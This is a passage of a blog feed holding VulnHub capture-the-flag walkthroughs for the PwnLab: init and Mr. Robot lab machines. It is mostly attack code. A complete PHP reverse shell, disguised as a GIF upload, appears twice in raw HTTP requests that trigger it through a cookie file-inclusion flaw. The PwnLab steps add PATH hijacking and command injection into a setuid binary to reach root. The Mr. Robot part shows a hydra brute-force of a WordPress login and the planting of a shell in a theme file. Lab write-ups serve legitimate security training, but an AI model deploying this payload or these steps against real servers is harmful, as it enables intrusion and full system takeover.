&lt;&#x2F;span&gt;&lt;span&gt;		break;
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; Wait until a command is end down $sock, or some
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; command output is available on STDOUT or STDERR
&lt;&#x2F;span&gt;&lt;span&gt;	$read_a = array($sock, $pipes[1], $pipes[2]);
&lt;&#x2F;span&gt;&lt;span&gt;	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; If we can read from the TCP socket, send
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; data to process&amp;#39;s STDIN
&lt;&#x2F;span&gt;&lt;span&gt;	if (in_array($sock, $read_a)) {
&lt;&#x2F;span&gt;&lt;span&gt;		if ($debug) printit(&amp;quot;SOCK READ&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		$input = fread($sock, $chunk_size);
&lt;&#x2F;span&gt;&lt;span&gt;		if ($debug) printit(&amp;quot;SOCK: $input&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		fwrite($pipes[0], $input);
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; If we can read from the process&amp;#39;s STDOUT
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; send data down tcp connection
&lt;&#x2F;span&gt;&lt;span&gt;	if (in_array($pipes[1], $read_a)) {
&lt;&#x2F;span&gt;&lt;span&gt;		if ($debug) printit(&amp;quot;STDOUT READ&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		$input = fread($pipes[1], $chunk_size);
&lt;&#x2F;span&gt;&lt;span&gt;		if ($debug) printit(&amp;quot;STDOUT: $input&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		fwrite($sock, $input);
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; If we can read from the process&amp;#39;s STDERR
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; send data down tcp connection
&lt;&#x2F;span&gt;&lt;span&gt;	if (in_array($pipes[2], $read_a)) {
&lt;&#x2F;span&gt;&lt;span&gt;		if ($debug) printit(&amp;quot;STDERR READ&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		$input = fread($pipes[2], $chunk_size);
&lt;&#x2F;span&gt;&lt;span&gt;		if ($debug) printit(&amp;quot;STDERR: $input&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		fwrite($sock, $input);
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;fclose($sock);
&lt;&#x2F;span&gt;&lt;span&gt;fclose($pipes[0]);
&lt;&#x2F;span&gt;&lt;span&gt;fclose($pipes[1]);
&lt;&#x2F;span&gt;&lt;span&gt;fclose($pipes[2]);
&lt;&#x2F;span&gt;&lt;span&gt;proc_close($process);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Like print, but does nothing if we&amp;#39;ve daemonised ourself
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; (I can&amp;#39;t figure out how to redirect STDOUT like a proper daemon)
&lt;&#x2F;span&gt;&lt;span&gt;function printit ($string) {
&lt;&#x2F;span&gt;&lt;span&gt;	if (!$daemon) {
&lt;&#x2F;span&gt;&lt;span&gt;		print &amp;quot;$string\n&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;?&amp;gt; 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;-----------------------------6484244853519591111205641705
&lt;&#x2F;span&gt;&lt;span&gt;Content-Disposition: form-data; name=&amp;quot;submit&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Upload
&lt;&#x2F;span&gt;&lt;span&gt;-----------------------------6484244853519591111205641705--
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;If you take a look at the Burpsuite result, you&#x27;ll notice the server created a link. &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;img &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;src&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;upload&#x2F;3208fd203ca8fdfa13bc98a4832c1396.gif&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;br &lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&amp;gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;center&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Try opening the file by using a Burpsuite GET request and it will dump the file as though it&#x27;s a plain text file. The problem with this if you try to access the file using the browser, it will give you an error &lt;code&gt;cannot be displayed because it contains errors&lt;&#x2F;code&gt;. This part can be misleading if you haven&#x27;t seen this type of method of bypass before because it leads you to think it&#x27;s caused by the &lt;code&gt;GIF87a&lt;&#x2F;code&gt; header.&lt;&#x2F;p&gt;
&lt;p&gt;In reality, if you reviewed the code carefully for the page &lt;code&gt;index.php&lt;&#x2F;code&gt;, you&#x27;ll notice a &lt;code&gt;lang&lt;&#x2F;code&gt; cookie check code uses an &lt;code&gt;include&lt;&#x2F;code&gt; statement. This piece of code lacks file sanitation and will load a file that you want to run.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;POST &#x2F;?page=upload HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;Host: 192.168.16.129
&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: Mozilla&#x2F;5.0 (X11; Linux i686; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0
&lt;&#x2F;span&gt;&lt;span&gt;Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q=0.9,*&#x2F;*;q=0.8
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Language: en-US,en;q=0.5
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Encoding: gzip, deflate
&lt;&#x2F;span&gt;&lt;span&gt;Referer: http:&#x2F;&#x2F;192.168.16.129&#x2F;?page=upload
&lt;&#x2F;span&gt;&lt;span&gt;Cookie: PHPSESSID=9vq5im5401eplh2imdb7tjoar0; lang=..&#x2F;upload&#x2F;3208fd203ca8fdfa13bc98a4832c1396.gif
&lt;&#x2F;span&gt;&lt;span&gt;Connection: close
&lt;&#x2F;span&gt;&lt;span&gt;Upgrade-Insecure-Requests: 1
&lt;&#x2F;span&gt;&lt;span&gt;Cache-Control: max-age=0
&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: multipart&#x2F;form-data; boundary=---------------------------3116742302425600613338252
&lt;&#x2F;span&gt;&lt;span&gt;Content-Length: 5838
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;-----------------------------3116742302425600613338252
&lt;&#x2F;span&gt;&lt;span&gt;Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;php-reverse-shell.gif&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: image&#x2F;gif
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;GIF87a
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;set_time_limit (0);
&lt;&#x2F;span&gt;&lt;span&gt;$VERSION = &amp;quot;1.0&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;$ip = &amp;#39;192.168.16.130&amp;#39;;  &#x2F;&#x2F; CHANGE THIS
&lt;&#x2F;span&gt;&lt;span&gt;$port = 4444;       &#x2F;&#x2F; CHANGE THIS
&lt;&#x2F;span&gt;&lt;span&gt;$chunk_size = 1400;
&lt;&#x2F;span&gt;&lt;span&gt;$write_a = null;
&lt;&#x2F;span&gt;&lt;span&gt;$error_a = null;
&lt;&#x2F;span&gt;&lt;span&gt;$shell = &amp;#39;uname -a; w; id; &#x2F;bin&#x2F;sh -i&amp;#39;;
&lt;&#x2F;span&gt;&lt;span&gt;$daemon = 0;
&lt;&#x2F;span&gt;&lt;span&gt;$debug = 0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Daemonise ourself if possible to avoid zombies later
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; pcntl_fork is hardly ever available, but will allow us to daemonise
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; our php process and avoid zombies.  Worth a try...
&lt;&#x2F;span&gt;&lt;span&gt;if (function_exists(&amp;#39;pcntl_fork&amp;#39;)) {
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; Fork and have the parent process exit
&lt;&#x2F;span&gt;&lt;span&gt;	$pid = pcntl_fork();
&lt;&#x2F;span&gt;&lt;span&gt;	
&lt;&#x2F;span&gt;&lt;span&gt;	if ($pid == -1) {
&lt;&#x2F;span&gt;&lt;span&gt;		printit(&amp;quot;ERROR: Can&amp;#39;t fork&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		exit(1);
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;	
&lt;&#x2F;span&gt;&lt;span&gt;	if ($pid) {
&lt;&#x2F;span&gt;&lt;span&gt;		exit(0);  &#x2F;&#x2F; Parent exits
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; Make the current process a session leader
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; Will only succeed if we forked
&lt;&#x2F;span&gt;&lt;span&gt;	if (posix_setsid() == -1) {
&lt;&#x2F;span&gt;&lt;span&gt;		printit(&amp;quot;Error: Can&amp;#39;t setsid()&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		exit(1);
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	$daemon = 1;
&lt;&#x2F;span&gt;&lt;span&gt;} else {
&lt;&#x2F;span&gt;&lt;span&gt;	printit(&amp;quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Change to a safe directory
&lt;&#x2F;span&gt;&lt;span&gt;chdir(&amp;quot;&#x2F;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Remove any umask we inherited
&lt;&#x2F;span&gt;&lt;span&gt;umask(0);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Do the reverse shell...
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Open reverse connection
&lt;&#x2F;span&gt;&lt;span&gt;$sock = fsockopen($ip, $port, $errno, $errstr, 30);
&lt;&#x2F;span&gt;&lt;span&gt;if (!$sock) {
&lt;&#x2F;span&gt;&lt;span&gt;	printit(&amp;quot;$errstr ($errno)&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;	exit(1);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Spawn shell process
&lt;&#x2F;span&gt;&lt;span&gt;$descriptorspec = array(
&lt;&#x2F;span&gt;&lt;span&gt;   0 =&amp;gt; array(&amp;quot;pipe&amp;quot;, &amp;quot;r&amp;quot;),  &#x2F;&#x2F; stdin is a pipe that the child will read from
&lt;&#x2F;span&gt;&lt;span&gt;   1 =&amp;gt; array(&amp;quot;pipe&amp;quot;, &amp;quot;w&amp;quot;),  &#x2F;&#x2F; stdout is a pipe that the child will write to
&lt;&#x2F;span&gt;&lt;span&gt;   2 =&amp;gt; array(&amp;quot;pipe&amp;quot;, &amp;quot;w&amp;quot;)   &#x2F;&#x2F; stderr is a pipe that the child will write to
&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;$process = proc_open($shell, $descriptorspec, $pipes);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;if (!is_resource($process)) {
&lt;&#x2F;span&gt;&lt;span&gt;	printit(&amp;quot;ERROR: Can&amp;#39;t spawn shell&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;	exit(1);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Set everything to non-blocking
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Reason: Occsionally reads will block, even though stream_select tells us they won&amp;#39;t
&lt;&#x2F;span&gt;&lt;span&gt;stream_set_blocking($pipes[0], 0);
&lt;&#x2F;span&gt;&lt;span&gt;stream_set_blocking($pipes[1], 0);
&lt;&#x2F;span&gt;&lt;span&gt;stream_set_blocking($pipes[2], 0);
&lt;&#x2F;span&gt;&lt;span&gt;stream_set_blocking($sock, 0);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;printit(&amp;quot;Successfully opened reverse shell to $ip:$port&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;while (1) {
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; Check for end of TCP connection
&lt;&#x2F;span&gt;&lt;span&gt;	if (feof($sock)) {
&lt;&#x2F;span&gt;&lt;span&gt;		printit(&amp;quot;ERROR: Shell connection terminated&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		break;
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; Check for end of STDOUT
&lt;&#x2F;span&gt;&lt;span&gt;	if (feof($pipes[1])) {
&lt;&#x2F;span&gt;&lt;span&gt;		printit(&amp;quot;ERROR: Shell process terminated&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		break;
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; Wait until a command is end down $sock, or some
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; command output is available on STDOUT or STDERR
&lt;&#x2F;span&gt;&lt;span&gt;	$read_a = array($sock, $pipes[1], $pipes[2]);
&lt;&#x2F;span&gt;&lt;span&gt;	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; If we can read from the TCP socket, send
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; data to process&amp;#39;s STDIN
&lt;&#x2F;span&gt;&lt;span&gt;	if (in_array($sock, $read_a)) {
&lt;&#x2F;span&gt;&lt;span&gt;		if ($debug) printit(&amp;quot;SOCK READ&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		$input = fread($sock, $chunk_size);
&lt;&#x2F;span&gt;&lt;span&gt;		if ($debug) printit(&amp;quot;SOCK: $input&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		fwrite($pipes[0], $input);
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; If we can read from the process&amp;#39;s STDOUT
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; send data down tcp connection
&lt;&#x2F;span&gt;&lt;span&gt;	if (in_array($pipes[1], $read_a)) {
&lt;&#x2F;span&gt;&lt;span&gt;		if ($debug) printit(&amp;quot;STDOUT READ&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		$input = fread($pipes[1], $chunk_size);
&lt;&#x2F;span&gt;&lt;span&gt;		if ($debug) printit(&amp;quot;STDOUT: $input&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		fwrite($sock, $input);
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; If we can read from the process&amp;#39;s STDERR
&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;&#x2F; send data down tcp connection
&lt;&#x2F;span&gt;&lt;span&gt;	if (in_array($pipes[2], $read_a)) {
&lt;&#x2F;span&gt;&lt;span&gt;		if ($debug) printit(&amp;quot;STDERR READ&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		$input = fread($pipes[2], $chunk_size);
&lt;&#x2F;span&gt;&lt;span&gt;		if ($debug) printit(&amp;quot;STDERR: $input&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;		fwrite($sock, $input);
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;fclose($sock);
&lt;&#x2F;span&gt;&lt;span&gt;fclose($pipes[0]);
&lt;&#x2F;span&gt;&lt;span&gt;fclose($pipes[1]);
&lt;&#x2F;span&gt;&lt;span&gt;fclose($pipes[2]);
&lt;&#x2F;span&gt;&lt;span&gt;proc_close($process);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; Like print, but does nothing if we&amp;#39;ve daemonised ourself
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; (I can&amp;#39;t figure out how to redirect STDOUT like a proper daemon)
&lt;&#x2F;span&gt;&lt;span&gt;function printit ($string) {
&lt;&#x2F;span&gt;&lt;span&gt;	if (!$daemon) {
&lt;&#x2F;span&gt;&lt;span&gt;		print &amp;quot;$string\n&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;	}
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;?&amp;gt; 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;-----------------------------3116742302425600613338252
&lt;&#x2F;span&gt;&lt;span&gt;Content-Disposition: form-data; name=&amp;quot;submit&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Upload
&lt;&#x2F;span&gt;&lt;span&gt;-----------------------------3116742302425600613338252--
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;You should be getting a reverse shell at this point.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Running linuxprivchecker and linenum scripts showed nothing out of the ordinary. Start to try basic enumeration using the current information I&#x27;ve already uncovered, mysql database login passwords and see if I could uncover data stored in home directories.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Kane&#x27;s login has succeeded:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;su kane
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Kane&#x27;s home folder contains a binary file named &lt;code&gt;msgmike&lt;&#x2F;code&gt;.  When executing the binary file, it tries to create a file in Mike&#x27;s home folder: &lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;&#x2F;home&#x2F;mike&#x2F;msg.txt
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;vulnhub-pwnlabinit&#x2F;pwnlab-msgmike.png&quot; alt=&quot;pwnlab-msgmike.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Using the PATH environment trick, we can escalate our privileges to Mike&#x27;s account. How this works is when you add the current directory to the PATH environment variable, it will read the &lt;code&gt;cat&lt;&#x2F;code&gt; file that you&#x27;ve created and contains a bash shell execution. &lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.hackingarticles.in&#x2F;linux-privilege-escalation-using-path-variable&#x2F;&quot;&gt;Read more about PATH escalation.&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;echo &amp;quot;&#x2F;bin&#x2F;bash&amp;quot; &amp;gt; cat
&lt;&#x2F;span&gt;&lt;span&gt;chmod +x cat
&lt;&#x2F;span&gt;&lt;span&gt;export PATH=.:$PATH
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;vulnhub-pwnlabinit&#x2F;pwnlab-path-privesc.png&quot; alt=&quot;pwnlab-path-privesc.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now that we&#x27;re in Mike&#x27;s account, his home folder contains a file called &lt;code&gt;msg2root&lt;&#x2F;code&gt;. When executing &lt;code&gt;msg2root&lt;&#x2F;code&gt;, it prompts a message &amp;quot;Message for root&amp;quot;. Whatever you type, it appears to just repeat itself back like the command &lt;code&gt;echo&lt;&#x2F;code&gt;. Taking a closer look at the binary, you will notice that at the end of the &lt;code&gt;&#x2F;root&#x2F;messages.txt&lt;&#x2F;code&gt; there is a semi colon. This could mean you can execute an additional command afterwards. All you have to do is execute a shell and you are now as root.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;vulnhub-pwnlabinit&#x2F;pwnlab-msg2root.png&quot; alt=&quot;pwnlab-msg2root.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;vulnhub-pwnlabinit&#x2F;pwnlab-msg2root-2.png&quot; alt=&quot;pwnlab-msg2root-2.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;vulnhub-pwnlabinit&#x2F;pwnlab-rooted.png&quot; alt=&quot;pwnlab-rooted.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Mr. Robot</title>
        <published>2019-05-10T00:00:00+00:00</published>
        <updated>2019-05-10T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/posts/vulnhub-mrrobot/" type="text/html"/>
        <id>https://johntuyen.com/posts/vulnhub-mrrobot/</id>
        
        <content type="html">&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;Robots.txt&lt;&#x2F;code&gt; contained a dictionary file and 1&#x2F;3 loot key. I&#x27;m guessing the dictionary file is used for bruteforcing the Wordpress login.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;The dictionary file &lt;code&gt;fsocity.dic&lt;&#x2F;code&gt; contained 858000 entries and it&#x27;s a lot to go through for brute force. Slim down the dictionary file for uniqueness showed 11400 entries which is way more efficient and quick to brute force with.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;cat fsocity.dic | sort -u &amp;gt; fsocity-sorted.dic
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now that we have the password sorted out, I&#x27;ve tried brute forcing using the generic &lt;code&gt;admin&lt;&#x2F;code&gt; username after trying to dig through the Wordpress pages for login information. After trying for couple of hours, clearly the username doesn&#x27;t exist. To determine the username exist or not, using the reset password function showed provides positive or negative results. The machine name is Mr Robot so I figured it&#x27;s based on the main character from the show &amp;quot;elliot&amp;quot;. Entering this username in the reset password form will show a positive result:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;The e-mail could not be sent. Possible reason: your host may have disabled the mail() function.
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Now that we have the username and password sorted out, time to brute force the Wordpress login page. Use &lt;code&gt;hydra&lt;&#x2F;code&gt; to brute force wordpress login.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;hydra -l elliot -P fsocity-mod.dic 192.168.123.104 -V http-form-post &amp;#39;&#x2F;wp-login.php:log=^USER^&amp;amp;pwd=^PASS^&amp;amp;wp-submit=Log In&amp;amp;testcookie=1:S=Location&amp;#39; -I
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;posts&#x2F;vulnhub-mrrobot&#x2F;hydra.png&quot; alt=&quot;hydra.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Edit the Wordpress theme file &lt;code&gt;header.php&lt;&#x2F;code&gt;. Insert the php reverse shell code and save it.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Prepare netcat session to receive reverse shell.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
